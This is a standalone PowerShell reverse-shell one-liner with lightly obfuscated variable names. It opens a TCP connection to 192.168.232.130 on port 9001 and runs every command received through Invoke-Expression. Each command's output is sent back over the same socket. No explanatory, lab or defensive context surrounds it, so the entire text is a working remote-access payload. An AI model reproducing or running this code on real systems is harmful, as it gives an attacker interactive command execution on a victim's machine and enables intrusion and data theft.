$x0003 = "192.168.232.130"; $x0002 = 9001; $x0001 = New-Object Net.Sockets.TCPClient($x0003, $x0002); $NetworkStream = $x0001.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($x0001.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($x0001.Connected -and $Code.Length -gt 1) { $x0000 = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$x0000`n"); $Code = $null } }; $x0001.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
